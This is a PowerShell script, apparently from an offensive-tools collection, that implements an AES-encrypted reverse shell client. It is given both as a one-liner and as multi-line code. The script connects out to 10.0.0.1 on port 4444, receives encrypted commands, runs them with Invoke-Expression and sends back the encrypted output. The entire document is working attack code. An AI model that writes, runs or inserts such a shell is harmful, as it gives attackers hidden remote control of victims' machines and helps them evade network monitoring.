
### Reverse Encrypted (AES 256-bit) Shell over TCP: Client. ###
### By: @ZHacker13 ###

### OneLine: $Base64="gFeiLF2hzwuMF3oYS1IOG6+pLZbUrOJDZQo2i0igsjc=";$Key=([Convert]::FromBase64String($Base64));$Client=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$Stream=$Client.GetStream();[byte[]]$Bytes=0..65535|%{0};while(($Read=$Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;$Command=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $Read);$DeCode=$Command | ConvertTo-SecureString -Key $Key;$OutPut=(IEX([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($DeCode))) 2>&1 | Out-String);$EnCode=ConvertTo-SecureString $OutPut -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;$SendByte=([text.encoding]::ASCII).GetBytes($EnCode);$Stream.Write($SendByte,0,$SendByte.Length);$Stream.Flush()};$Client.Close();Exit ###

$Base64 = "gFeiLF2hzwuMF3oYS1IOG6+pLZbUrOJDZQo2i0igsjc=";
$Key = ([Convert]::FromBase64String($Base64));
$Client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);
$Stream = $Client.GetStream();
[byte[]]$Bytes = 0..65535|%{0};
while(($Read = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;
$Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $Read);
$DeCode = $Command | ConvertTo-SecureString -Key $Key;
$OutPut = (IEX([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($DeCode))) 2>&1 | Out-String);
$EnCode = ConvertTo-SecureString $OutPut -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;
$SendByte = ([text.encoding]::ASCII).GetBytes($EnCode);
$Stream.Write($SendByte,0,$SendByte.Length);
$Stream.Flush()};
$Client.Close();
Exit;